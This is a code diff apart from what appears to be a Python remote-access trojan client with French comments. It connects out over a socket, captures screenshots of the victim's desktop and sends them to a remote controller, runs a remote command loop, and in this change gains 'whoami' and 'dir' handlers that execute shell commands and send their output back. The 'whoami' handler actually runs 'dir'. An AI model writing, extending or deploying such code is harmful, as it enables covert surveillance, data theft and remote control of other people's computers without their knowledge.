@@ -12,7 +12,6 @@ from vidstream import ScreenShareClient
 from cryptography.fernet import Fernet
 import base64
 
-
 def screenshot():
     with mss() as sct:
         sct.shot(output="screen.png")
@@ -22,9 +21,6 @@ def screenface():
         sct.shot(output="screenface.png")
 
 t = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-
-
 #chiffrer le host et le port
 key1 = Fernet.generate_key()
 crypt = Fernet(key1)
@@ -104,7 +100,6 @@ while True:
         t.send(len_img.encode("utf-8"))
         with open("screenface.png", "rb") as img:
             t.send(img.read())
-
     #pour le commander
     elif commande =="start_commander":
         while True:
@@ -119,7 +114,6 @@ while True:
 
             elif commande == "stop":
                 break
-
     #pour une screen du bureau
     elif commande == "screenshot":
         screenshot()
@@ -127,6 +121,16 @@ while True:
         t.send(len_img.encode("utf-8"))
         with open("screen.png", "rb") as img:
             t.send(img.read())
+
+
+    #phase de test pour la commande whoami
+    elif commande =="whoami":
+        result = subprocess.Popen("dir", shell=True, stdout=subprocess.PIPE)
+        t.send(result.stdout.read())
+    #phase de test pour la commande dir
+    elif commande =='dir':
+        result = subprocess.Popen("dir", shell=True, stdout=subprocess.PIPE)
+        t.send(result.stdout.read())
     #pareil commande cd
     elif commande =="cd":
         result = subprocess.Popen("cd", shell=True, stdout=subprocess.PIPE)
